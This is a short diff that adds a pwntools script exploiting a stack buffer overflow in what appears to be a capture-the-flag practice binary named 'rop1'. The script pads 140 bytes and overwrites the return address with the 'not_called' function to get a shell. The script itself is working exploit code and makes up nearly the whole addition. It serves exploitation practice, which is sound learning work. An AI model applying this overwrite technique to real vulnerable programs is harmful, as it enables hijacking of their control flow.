@@ -52,3 +52,24 @@
  '\n'
  'Make sure the binary is accessible at the specified path '
  '(`./pwn/stack/rop-1/rop1`) and has the necessary permissions to execute.')
+
+from pwn import *
+
+# Load the ELF binary
+elf = ELF('./pwn/stack/rop-1/rop1')
+
+# Start the process
+p = process('./pwn/stack/rop-1/rop1')
+
+# Calculate the offset to the return address
+offset = 136 + 4  # Buffer size + saved EBP (frame pointer)
+
+# Build the payload
+payload = b'A' * offset
+payload += p32(elf.symbols['not_called'])  # Overwrite return address with 'not_called' function address
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
